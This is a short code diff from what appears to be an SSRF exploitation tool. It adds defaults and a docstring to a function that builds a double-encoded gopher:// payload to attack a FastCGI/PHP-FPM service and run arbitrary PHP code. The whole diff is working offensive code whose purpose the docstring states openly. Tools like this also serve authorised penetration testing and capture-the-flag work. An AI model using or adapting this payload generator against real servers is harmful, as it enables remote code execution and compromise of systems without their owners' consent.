@@ -244,7 +244,18 @@ def generate_code_payload(host, port, phpcode, php_file_path):
     return client.request(params, phpcode)
 
 
-def gopherfastcgi_code(host, port, phpcode, php_file_path):
+def gopherfastcgi_code(host: str = "127.0.0.1", port: int = 9000, phpcode: str = "phpinfo();", php_file_path: str = "/var/www/html/index.php"):
+    """generate gopher payload for attack fastcgi to arbitrary code execution.
+
+    Args:
+        host (str): target fastcgi host.
+        port (str): target fastcgi port.
+        phpcode (str, optional): code you want to run. Defaults to "phpinfo();".
+        php_file_path (str, optional): a path to an existing PHP file. Defaults to "/var/www/html/index.php".
+
+    Returns:
+        str: generated payload
+    """
     raw_payload = generate_code_payload(host, port, phpcode, php_file_path)
     request_ssrf = urlparse.quote(urlparse.quote(raw_payload))
     return f"gopher://{host}:{port}/_{request_ssrf}"
